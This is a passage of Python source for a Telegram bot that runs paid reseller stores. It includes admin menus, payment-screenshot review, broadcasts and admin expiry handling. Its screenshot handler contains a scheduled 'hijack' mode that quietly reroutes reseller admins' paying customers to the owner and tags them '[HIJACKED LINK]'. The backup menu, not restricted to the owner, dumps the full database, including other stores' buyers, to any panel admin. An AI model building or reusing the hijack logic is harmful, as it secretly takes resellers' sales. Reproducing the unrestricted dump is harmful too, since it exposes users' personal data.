        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_DESC_{pid}"
        update_admin_panel(uid, "✍️ Send new description:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}"))); return
    if data.startswith("adm_ped_link_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_LINK_{pid}"
        update_admin_panel(uid, "🔗 Send new link:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}"))); return
    if data.startswith("adm_ped_paym_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_PAYM_{pid}"
        update_admin_panel(uid, "💳 Send payment text for this button (or `skip` for global):", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}"))); return

    if data == "adm_prod_pos_list":
        mk = InlineKeyboardMarkup()
        for p in sorted(r.get("products", []), key=lambda x: x.get("position", 999)):
            mk.row(InlineKeyboardButton(f"#{p.get('position',999)} ➡️ {p['name']}", callback_data=f"adm_p_pos_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "🔢 Change position (click then type number):", mk); return
    if data.startswith("adm_p_pos_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_POS_{pid}"
        update_admin_panel(uid, "🔢 Type new position number:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_pos_list"))); return

    if data == "adm_prod_add_vid_list":
        mk = InlineKeyboardMarkup()
        for p in r.get("products", []):
            mk.row(InlineKeyboardButton(f"🎦 {p['name']}", callback_data=f"adm_p_addvid_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Add videos to which button?", mk); return
    if data.startswith("adm_p_addvid_"):
        pid = data.split("_")[3]; user_states[uid] = f"ADM_UPL_PROD_VID_MULTIPLE_{pid}"
        mk = InlineKeyboardMarkup(); mk.row(InlineKeyboardButton("✅ Done", callback_data=f"adm_p_finish_{pid}")).row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_add_vid_list"))
        update_admin_panel(uid, "📥 Send videos. When done:", mk); return
    if data.startswith("adm_p_finish_"):
        show_store_admin_menu(uid); return

    if data == "adm_prod_del_vid_list":
        mk = InlineKeyboardMarkup()
        for p in r.get("products", []):
            mk.row(InlineKeyboardButton(f"⚙️ ({len(p.get('videos',[]))}) {p['name']}", callback_data=f"adm_p_mngv_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Manage videos of:", mk); return
    if data.startswith("adm_p_mngv_"):
        pid = data.split("_")[3]
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p:
            mk = InlineKeyboardMarkup()
            for i, v in enumerate(p.get("videos", [])):
                mk.row(InlineKeyboardButton(f"👀 {i+1}", callback_data=f"pv_see_{pid}_{i}"),
                       InlineKeyboardButton(f"🗑️ {i+1}", callback_data=f"pv_del_{pid}_{i}"))
            if p.get("videos"): mk.row(InlineKeyboardButton("💥 Delete All", callback_data=f"pv_dall_{pid}"))
            mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_del_vid_list"))
            update_admin_panel(uid, f"Videos of `{p['name']}`:", mk)
        return
    if data.startswith("pv_see_"):
        _, _, pid, i = data.split("_")
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p and int(i) < len(p.get("videos", [])):
            m = InlineKeyboardMarkup(); m.row(InlineKeyboardButton("❌ Close", callback_data="del_msg"))
            bot.send_video(uid, p["videos"][int(i)], reply_markup=m)
        return
    if data.startswith("pv_del_"):
        _, _, pid, i = data.split("_")
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p and int(i) < len(p.get("videos", [])): p["videos"].pop(int(i))
        save_db(); call.data = f"adm_p_mngv_{pid}"; _store_admin_handle(call); return
    if data.startswith("pv_dall_"):
        pid = data.split("_")[2]
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p: p["videos"] = []
        save_db(); call.data = f"adm_p_mngv_{pid}"; _store_admin_handle(call); return

    if data == "adm_del_prod_list":
        mk = InlineKeyboardMarkup()
        for p in r.get("products", []):
            mk.row(InlineKeyboardButton(f"🗑️ {p['name']}", callback_data=f"adm_del_p_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Delete which button?", mk); return
    if data.startswith("adm_del_p_"):
        pid = data.split("_")[3]
        r["products"] = [x for x in r.get("products", []) if x["id"] != pid]
        save_db(); call.data = "adm_del_prod_list"; _store_admin_handle(call); return

    if data == "adm_edit_welcome":
        user_states[uid] = "ADM_SET_WELCOME"
        update_admin_panel(uid, "📝 Send new Welcome text (`{name}` = user name):", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
    if data == "adm_toggle_layout":
        r["layout_style"] = "horizontal" if r.get("layout_style") == "vertical" else "vertical"
        save_db(); show_store_admin_menu(uid); return
    if data == "adm_set_how_vid":
        user_states[uid] = "ADM_SET_HOW_VID"
        update_admin_panel(uid, "🎥 Send 'How To Use' video:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return

    if data == "adm_pay_config_menu":
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("💳 Set Global Payment QR/Photo", callback_data="adm_set_pay_photo"))
        mk.row(InlineKeyboardButton("✏️ Edit Global Payment Text", callback_data="adm_edit_pay_msg"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        update_admin_panel(uid, "💳 **Global Payment Config**", mk); return
    if data == "adm_set_pay_photo":
        user_states[uid] = "ADM_SET_PAY_PHOTO"
        update_admin_panel(uid, "💳 Send payment QR photo:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_pay_config_menu"))); return
    if data == "adm_edit_pay_msg":
        user_states[uid] = "ADM_SET_PAY_MSG_TEXT"
        update_admin_panel(uid, f"✍️ Current: `{r.get('payment_msg')}`\n\nSend new payment text:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_pay_config_menu"))); return

    if is_owner(uid):
        if data == "adm_send_custom_bc":
            user_states[uid] = "WAITING_CUSTOM_BROADCAST"
            update_admin_panel(uid, "🚀 **Global Broadcast:** Send message to broadcast to ALL USERS across ALL ADMIN STORES:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return

        if data == "adm_autobc_menu":
            bc = r.get("auto_bc", {})
            st = "🟢 ON" if bc.get("status") else "🔴 OFF"
            iv = bc.get("interval_seconds", 3600)
            ivt = f"{iv}s" if iv < 60 else (f"{iv//60}m" if iv < 3600 else f"{iv//3600}h")
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton(("🔴 Turn OFF" if bc.get("status") else "🟢 Turn ON"), callback_data="adm_autobc_toggle"))
            mk.row(InlineKeyboardButton("✏️ Set Message & Media", callback_data="adm_autobc_set_msg"))
            mk.row(InlineKeyboardButton("⏱️ Preset Time", callback_data="adm_autobc_set_time"))
            mk.row(InlineKeyboardButton("✍️ Custom Timer", callback_data="adm_autobc_custom_time"))
            mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
            prev = (bc.get("text") or "Not set"); prev = (prev[:50]+"...") if len(prev) > 50 else prev
            update_admin_panel(uid, f"⏱️ **Auto Broadcast**\nStatus: {st}\nInterval: {ivt} ({iv}s)\nType: {bc.get('message_type')}\nPreview: {prev}", mk); return
        if data == "adm_autobc_toggle":
            r["auto_bc"]["status"] = not r["auto_bc"].get("status", False); save_db()
            call.data = "adm_autobc_menu"; _store_admin_handle(call); return
        if data == "adm_autobc_set_msg":
            user_states[uid] = "WAITING_AUTOBC_MSG"
            update_admin_panel(uid, "📤 Send the message to loop automatically:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu"))); return
        if data == "adm_autobc_set_time":
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton("10s", callback_data="adm_autobc_t_10"), InlineKeyboardButton("1m", callback_data="adm_autobc_t_60"), InlineKeyboardButton("5m", callback_data="adm_autobc_t_300"))
            mk.row(InlineKeyboardButton("1h", callback_data="adm_autobc_t_3600"), InlineKeyboardButton("6h", callback_data="adm_autobc_t_21600"), InlineKeyboardButton("24h", callback_data="adm_autobc_t_86400"))
            mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu"))
            update_admin_panel(uid, "⏱️ Select preset interval:", mk); return
        if data.startswith("adm_autobc_t_"):
            r["auto_bc"]["interval_seconds"] = int(data.split("_")[3]); save_db()
            call.data = "adm_autobc_menu"; _store_admin_handle(call); return
        if data == "adm_autobc_custom_time":
            user_states[uid] = "WAITING_AUTOBC_CUSTOM_TIME"
            update_admin_panel(uid, "✍️ Type timer in **seconds** (e.g. 30, 120, 3600):", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu"))); return

        if data == "adm_buyers_bc_menu":
            user_states[uid] = "WAITING_BUYERS_BROADCAST"
            update_admin_panel(uid, "👑 Send message to YOUR buyers only:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return

    if data == "adm_view_buyers_list":
        buyers = r.get("buyers", [])
        if not buyers: txt = "📦 No buyers yet."
        else:
            txt = "📦 **Buyers (last 20):**\n\n"
            for i, b in enumerate(buyers[-20:], 1):
                txt += f"{i}. {b.get('name')} @{b.get('username')} (`{b.get('user_id')}`)\n   🛍️ {b.get('product')} | {b.get('date')}\n"
        mk = InlineKeyboardMarkup(); mk.row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, txt, mk); return

    if data == "adm_backup_menu":
        js = json.dumps(DB_STATE, default=str)
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("📥 Restore", callback_data="adm_restore_prompt"))
        mk.row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, f"💾 **Full Backup:**\n`{js[:3500]}`", mk); return
    if data == "adm_restore_prompt":
        user_states[uid] = "WAITING_RESTORE_CODE"
        update_admin_panel(uid, "📥 Send backup JSON code:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_backup_menu"))); return

    if data == "adm_unblock_menu":
        mk = InlineKeyboardMarkup()
        for b in r.get("blocked_users", []):
            mk.row(InlineKeyboardButton(f"🔓 Unblock {b}", callback_data=f"adm_unblock_exec_{b}"))
        mk.row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, "🛡️ Unblock user:", mk); return
    if data.startswith("adm_unblock_exec_"):
        b = int(data.split("_")[3])
        if b in r.get("blocked_users", []): r["blocked_users"].remove(b)
        save_db(); call.data = "adm_unblock_menu"; _store_admin_handle(call); return

    if data.startswith("adm_confirm_"):
        parts = data.split("_"); s_uid, pid, cust = parts[2], parts[3], int(parts[4])
        if str(s_uid) != str(uid): return
        sr = get_store(s_uid)
        prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
        link = prod.get("link", "No link") if prod else "No link"
        pname = prod.get("name", "Product") if prod else "Product"
        try:
            u = bot.get_chat(cust); nm = u.first_name or "User"; un = u.username or "unknown"
        except Exception:
            nm, un = "User", "unknown"
        sr["buyers"].append({"user_id": cust, "name": nm, "username": un, "product": pname,
                             "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")})
        t = today_str()
        st = sr.setdefault("stats", {}).setdefault(t, {"accepted": 0, "requests": 0, "by_product": {}})
        st["accepted"] += 1
        st["by_product"][pname] = st["by_product"].get(pname, 0) + 1
        save_db()
        bot.send_message(cust, f"✅ **Payment Confirmed!**\n\nLink:\n🔗 {link}", parse_mode="Markdown")
        try:
            bot.edit_message_caption(caption=f"{call.message.caption}\n\n✅ **Status:** Confirmed & Link Sent!", chat_id=uid, message_id=call.message.message_id, parse_mode="Markdown")
        except Exception: pass
        return
    if data.startswith("adm_reject_"):
        parts = data.split("_"); s_uid, cust = parts[2], int(parts[3])
        if str(s_uid) != str(uid): return
        bot.send_message(cust, get_store(s_uid).get("reject_msg", DEFAULT_REJECT))
        try:
            bot.edit_message_caption(caption=f"{call.message.caption}\n\n❌ **Status:** Rejected by Admin", chat_id=uid, message_id=call.message.message_id, parse_mode="Markdown")
        except Exception: pass
        return
    if data.startswith("adm_block_"):
        parts = data.split("_"); s_uid, cust = parts[2], int(parts[3])
        if str(s_uid) != str(uid): return
        if cust not in get_store(s_uid).get("blocked_users", []):
            get_store(s_uid)["blocked_users"].append(cust); save_db()
        try:
            bot.edit_message_caption(caption=f"{call.message.caption}\n\n🚫 **Status:** User Blocked!", chat_id=uid, message_id=call.message.message_id, parse_mode="Markdown")
        except Exception: pass
        return

# ============ INPUTS & BROADCAST ============
def do_single_store_broadcast(target_store, message):
    ok = fail = 0
    for u_id in target_store.get("users", []):
        if u_id in target_store.get("blocked_users", []): continue
        try:
            if message.content_type == 'text':
                bot.send_message(u_id, message.text, parse_mode="Markdown")
            elif message.content_type == 'photo':
                bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
            elif message.content_type == 'video':
                bot.send_video(u_id, message.video.file_id, caption=message.caption, parse_mode="Markdown")
            elif message.content_type == 'document':
                bot.send_document(u_id, message.document.file_id, caption=message.caption, parse_mode="Markdown")
            ok += 1
        except Exception:
            fail += 1
    return ok, fail

def do_global_broadcast(message):
    all_admin_ids = set(DB_STATE.get("stores", {}).keys())
    all_target_users = set()
    
    for r_id, r_data in DB_STATE.get("stores", {}).items():
        for u_id in r_data.get("users", []):
            if u_id not in r_data.get("blocked_users", []) and str(u_id) not in all_admin_ids:
                all_target_users.add(u_id)

    ok = fail = 0
    for u_id in all_target_users:
        try:
            if message.content_type == 'text':
                bot.send_message(u_id, message.text, parse_mode="Markdown")
            elif message.content_type == 'photo':
                bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
            elif message.content_type == 'video':
                bot.send_video(u_id, message.video.file_id, caption=message.caption, parse_mode="Markdown")
            elif message.content_type == 'document':
                bot.send_document(u_id, message.document.file_id, caption=message.caption, parse_mode="Markdown")
            ok += 1
        except Exception:
            fail += 1
    return ok, fail

def parse_duration(txt):
    txt = (txt or "").strip().lower()
    if txt in ("0", "remove", "revoke"): return 0
    sign = -1 if txt.startswith("-") else 1
    t = txt.lstrip("+-")
    mult = 1
    if t.endswith("s"): mult = 1; t = t[:-1]
    elif t.endswith("m"): mult = 60; t = t[:-1]
    elif t.endswith("h"): mult = 3600; t = t[:-1]
    elif t.endswith("d"): mult = 86400; t = t[:-1]
    try: return sign * int(float(t) * mult)
    except Exception: return None

@bot.message_handler(content_types=['photo', 'video', 'text', 'document'])
def handle_all_inputs(message):
    uid = message.chat.id
    state = user_states.get(uid, "")

    if can_use_panel(uid) and message.reply_to_message:
        rep = message.reply_to_message.text or message.reply_to_message.caption or ""
        m = re.search(r'`(\d+)`', rep)
        if m:
            target = int(m.group(1))
            try:
                bot.copy_message(chat_id=target, from_chat_id=uid, message_id=message.message_id)
                bot.reply_to(message, "✅ Reply sent!")
            except Exception as e:
                bot.reply_to(message, f"❌ {e}")
            return

    if state.startswith("WAITING_REPORT_"):
        target_s_uid = state.replace("WAITING_REPORT_", "")
        dest_seller_uid = get_effective_seller(target_s_uid)
        
        user_states.pop(uid, None)
        bot.send_message(uid, "✅ Your report has been sent to admin.")
        un = message.from_user.username
        tag = f"@{un}" if un else "No Username"
        bot.send_message(int(dest_seller_uid), f"📩 **Report from {tag} (`{uid}`):**\n\n{message.text}\n\n*Reply to forward your answer.*", parse_mode="Markdown")
        return

    if state.startswith("WAITING_SCREENSHOT_"):
        parts = state.split("_"); orig_s_uid, pid = parts[2], parts[3]
        dest_s_uid = get_effective_seller(orig_s_uid)
        
        if message.content_type == 'photo':
            sr = get_store(dest_s_uid)
            user_states.pop(uid, None)
            bot.send_message(uid, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁.... 𝗪𝗮𝗶𝘁 5-𝟭𝗼 𝗺𝗶𝗻.")
            prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
            pname = prod["name"] if prod else "Unknown"
            
            t = today_str()
            st = sr.setdefault("stats", {}).setdefault(t, {"accepted": 0, "requests": 0, "by_product": {}})
            st["requests"] += 1
            record_hijack_stat(orig_s_uid, pname)
            save_db()
            
            un = message.from_user.username; tag = f"@{un}" if un else "No Username"
            nm = message.from_user.first_name or "User"
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{dest_s_uid}_{pid}_{uid}"),
                   InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{dest_s_uid}_{uid}"))
            mk.row(InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{dest_s_uid}_{uid}"))
            
            caption_info = f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {pname}\n👤 {tag}\n📛 {nm}\n🆔 `{uid}`"
            if is_hijack_active() and str(orig_s_uid) != str(OWNER_ID):
                orig_adm = get_store(orig_s_uid)
                adm_nm = orig_adm.get("name") if orig_adm else "Admin"
                caption_info += f"\n\n🌙 **[HIJACKED LINK]** From Admin: {adm_nm} (`{orig_s_uid}`)"

            try:
                bot.send_photo(int(dest_s_uid), message.photo[-1].file_id, caption=caption_info, reply_markup=mk, parse_mode="Markdown")
            except Exception: pass
        return

    # ============ Reseller inputs ============
    if can_use_panel(uid):
        rr = get_store(uid)
        if not is_owner(uid) and rr.get("expires_at") is not None and now() > rr["expires_at"]:
            return
        if state and not state.startswith("WAITING_REPORT_") and not state.startswith("WAITING_SCREENSHOT_"):
            try: bot.delete_message(uid, message.message_id)
            except Exception: pass

        if state == "WAITING_HIJACK_TIME" and message.text and is_owner(uid):
            try:
                parts = message.text.strip().split("-")
                if len(parts) == 2:
                    st, et = parts[0].strip(), parts[1].strip()
                    cfg = DB_STATE.setdefault("hijack_config", {})
                    cfg["start_time"] = st
                    cfg["end_time"] = et
                    save_db()
                    user_states.pop(uid, None)
                    update_admin_panel(uid, f"✅ Hijack Schedule set to: `{st}` - `{et}`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_hijack_menu")))
                else:
                    update_admin_panel(uid, "❌ Invalid format! Use `02:00-06:10`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
            except Exception:
                update_admin_panel(uid, "❌ Error parsing time. Use format `02:00-06:10`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
            return

        if state == "OWN_ADD_ADMIN_ID" and message.text and is_owner(uid):
            try:
                nid = int(message.text.strip())
                if get_store(nid):
                    update_admin_panel(uid, f"⚠️ ID `{nid}` already exists.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage Admins", callback_data="own_admins_menu")))
                else:
                    user_states[uid] = f"OWN_ADD_ADMIN_EXP_{nid}"
                    update_admin_panel(uid, f"✅ ID `{nid}` ok.\n⏱️ Now type expiry: `30`, `10m`, `2h`, `1d`, `7d`...", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))
            except Exception:
                update_admin_panel(uid, "❌ Invalid ID.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage Admins", callback_data="own_admins_menu")))
            return
        if state.startswith("OWN_ADD_ADMIN_EXP_") and is_owner(uid):
            nid = int(state.replace("OWN_ADD_ADMIN_EXP_", ""))
            dur = parse_duration(message.text or "")
            if dur is not None:
                exp_timestamp = now() + max(dur, 1) if dur > 0 else None
                ensure_store(nid, role="admin", name=f"Admin {nid}", username="", expires_at=exp_timestamp)
                save_db(); user_states.pop(uid, None)
                update_admin_panel(uid, f"✅ **Admin `{nid}` added**, expiry {fmt_expiry(get_store(nid)['expires_at'])}.\nTell them to press /start", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage Admins", callback_data="own_admins_menu")))
            else:
                update_admin_panel(uid, "❌ Invalid duration. Use `30`, `5m`, `2h`, `1d`.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))
            return

        if state.startswith("OWN_EXP_IN_") and is_owner(uid):
            target = state.replace("OWN_EXP_IN_", "")
            a = get_store(target)
            if a:
                dur = parse_duration(message.text or "")
                if dur == 0:
                    a["expires_at"] = now()
                elif dur is not None:
                    cur = a.get("expires_at") or now()
                    a["expires_at"] = cur + dur
                    if a["expires_at"] < now(): a["expires_at"] = now()
                else:
                    update_admin_panel(uid, "❌ Invalid format.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_exp_list"))); return
                save_db(); user_states.pop(uid, None)
                update_admin_panel(uid, f"✅ New expiry of `{target}`: **{fmt_expiry(a['expires_at'])}**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage Admins", callback_data="own_admins_menu")))
            return

        if state.startswith("OWN_C_PAYPHOTO_") and message.content_type == 'photo' and is_owner(uid):
            t = state.replace("OWN_C_PAYPHOTO_", ""); a = get_store(t)
            a["payment_photo"] = message.photo[-1].file_id; save_db(); user_states.pop(uid, None)
            update_admin_panel(uid, f"✅ Payment QR updated for `{t}`.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}"))); return
        if state.startswith("OWN_C_PAYMSG_") and message.content_type == 'text' and is_owner(uid):
            t = state.replace("OWN_C_PAYMSG_", ""); a = get_store(t)
            a["payment_msg"] = message.text; save_db(); user_states.pop(uid, None)
            update_admin_panel(uid, f"✅ Payment text updated for `{t}`.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}"))); return
        if state.startswith("OWN_C_TIMERBC_") and message.content_type in ("photo", "video", "document", "text") and is_owner(uid):
            t = state.replace("OWN_C_TIMERBC_", ""); a = get_store(t)
            m_type = message.content_type; f_id = None
            txt = message.caption or message.text or ""
            if m_type == "photo": f_id = message.photo[-1].file_id
            elif m_type == "video": f_id = message.video.file_id
            elif m_type == "document": f_id = message.document.file_id
            a["auto_bc"]["message_type"] = m_type; a["auto_bc"]["file_id"] = f_id; a["auto_bc"]["text"] = txt
            save_db(); user_states.pop(uid, None)
            update_admin_panel(uid, f"✅ Timer broadcast content updated for `{t}`.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}"))); return
        if state.startswith("OWN_C_INSTANTBC_") and is_owner(uid):
            t = state.replace("OWN_C_INSTANTBC_", ""); a = get_store(t)
            user_states.pop(uid, None)
            update_admin_panel(uid, f"🚀 Sending to `{t}`'s users...", None)
            ok, fail = do_single_store_broadcast(a, message)
            update_admin_panel(uid, f"✅ Instant broadcast done for `{t}`.\nSent: {ok} | Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}"))); return

        if state == "ADM_ADD_START_VID_MULTIPLE" and message.content_type == 'video':
            r = get_store(uid); r.setdefault("start_videos", []).append(message.video.file_id); save_db()
            mk = InlineKeyboardMarkup(); mk.row(InlineKeyboardButton("✅ Done", callback_data="adm_finish_start_vids"))
            update_admin_panel(uid, f"📥 Send more. Added: {len(r['start_videos'])}", mk); return
        if state.startswith("ADM_UPL_PROD_VID_MULTIPLE_") and message.content_type == 'video':
            r = get_store(uid); pid = state.replace("ADM_UPL_PROD_VID_MULTIPLE_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p:
                p.setdefault("videos", []).append(message.video.file_id); save_db()
                mk = InlineKeyboardMarkup(); mk.row(InlineKeyboardButton("✅ Done", callback_data=f"adm_p_finish_{pid}"))
                update_admin_panel(uid, f"📥 Send more. Total: {len(p['videos'])}", mk)
            return
        if state.startswith("EDIT_P_NAME_") and message.text:
            r = get_store(uid); pid = state.replace("EDIT_P_NAME_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["name"] = message.text; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return
        if state.startswith("EDIT_P_DESC_") and message.text:
            r = get_store(uid); pid = state.replace("EDIT_P_DESC_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["desc"] = message.text; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return
        if state.startswith("EDIT_P_LINK_") and message.text:
            r = get_store(uid); pid = state.replace("EDIT_P_LINK_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["link"] = message.text; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return
        if state.startswith("EDIT_P_PAYM_") and message.text:
            r = get_store(uid); pid = state.replace("EDIT_P_PAYM_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["pay_msg"] = "" if message.text.strip().lower() == "skip" else message.text; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return
        if state.startswith("EDIT_P_POS_") and message.text:
            r = get_store(uid); pid = state.replace("EDIT_P_POS_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            try:
                if p: p["position"] = int(message.text); save_db()
            except ValueError: pass
            user_states.pop(uid, None); show_store_admin_menu(uid); return

        if state == "ADM_ADD_PROD_NAME" and message.text:
            r = get_store(uid)
            pid = str(len(r.get("products", [])) + 1)
            r["products"].append({"id": pid, "name": message.text, "desc": "", "videos": [],
                                  "link": "", "position": len(r.get("products", [])) + 1, "pay_msg": ""})
            save_db(); user_states[uid] = f"ADM_ADD_PROD_LINK_{pid}"
            update_admin_panel(uid, f"✅ `{message.text}` created.\n🔗 Now send delivery LINK:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu"))); return
        if state.startswith("ADM_ADD_PROD_LINK_") and message.text:
            r = get_store(uid); pid = state.replace("ADM_ADD_PROD_LINK_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["link"] = message.text; save_db()
            user_states[uid] = f"ADM_ADD_PROD_DESC_{pid}"
            update_admin_panel(uid, "✅ Link saved.\n✍️ Send product DESCRIPTION (or /skip):", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu"))); return
        if state.startswith("ADM_ADD_PROD_DESC_") and message.text:
            r = get_store(uid); pid = state.replace("ADM_ADD_PROD_DESC_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["desc"] = "" if message.text.strip() == "/skip" else message.text; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return

        if state == "ADM_SET_WELCOME" and message.text:
            r = get_store(uid); r["welcome_msg"] = message.text; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return
        if state == "ADM_SET_HOW_VID" and message.content_type == 'video':
            r = get_store(uid); r["how_to_use_video"] = message.video.file_id; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return
        if state == "ADM_SET_PAY_PHOTO" and message.content_type == 'photo':
            r = get_store(uid); r["payment_photo"] = message.photo[-1].file_id; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return
        if state == "ADM_SET_PAY_MSG_TEXT" and message.text:
            r = get_store(uid); r["payment_msg"] = message.text; save_db()
            user_states.pop(uid, None); show_store_admin_menu(uid); return

        if is_owner(uid):
            if state == "WAITING_CUSTOM_BROADCAST":
                user_states.pop(uid, None)
                update_admin_panel(uid, "🚀 Sending global broadcast to ALL users across ALL admin stores...", None)
                ok, fail = do_global_broadcast(message)
                update_admin_panel(uid, f"✅ Global Broadcast Done\nSent: {ok} | Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))); return
            if state == "WAITING_AUTOBC_MSG":
                r = get_store(uid); user_states.pop(uid, None)
                m_type = message.content_type; f_id = None
                txt = message.caption or message.text or ""
                if m_type == "photo": f_id = message.photo[-1].file_id
                elif m_type == "video": f_id = message.video.file_id
                elif m_type == "document": f_id = message.document.file_id
                r["auto_bc"]["message_type"] = m_type; r["auto_bc"]["file_id"] = f_id; r["auto_bc"]["text"] = txt
                save_db()
                update_admin_panel(uid, "✅ Auto broadcast message saved. Turn status ON in menu.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Auto BC", callback_data="adm_autobc_menu"))); return
            if state == "WAITING_AUTOBC_CUSTOM_TIME" and message.text:
                r = get_store(uid); user_states.pop(uid, None)
                try:
                    r["auto_bc"]["interval_seconds"] = max(int(message.text.strip()), 1); save_db()
                    update_admin_panel(uid, f"✅ Timer set: {r['auto_bc']['interval_seconds']}s", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Auto BC", callback_data="adm_autobc_menu")))
                except ValueError:
                    update_admin_panel(uid, "❌ Invalid number.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Auto BC", callback_data="adm_autobc_menu"))); return
            if state == "WAITING_BUYERS_BROADCAST":
                r = get_store(uid); user_states.pop(uid, None)
                update_admin_panel(uid, "👑 Sending to buyers...", None)
                ok = fail = 0; seen = set()
                for b in r.get("buyers", []):
                    if b.get("user_id") in seen or b.get("user_id") in r.get("blocked_users", []): continue
                    seen.add(b.get("user_id"))
                    try:
                        if message.content_type == 'text':
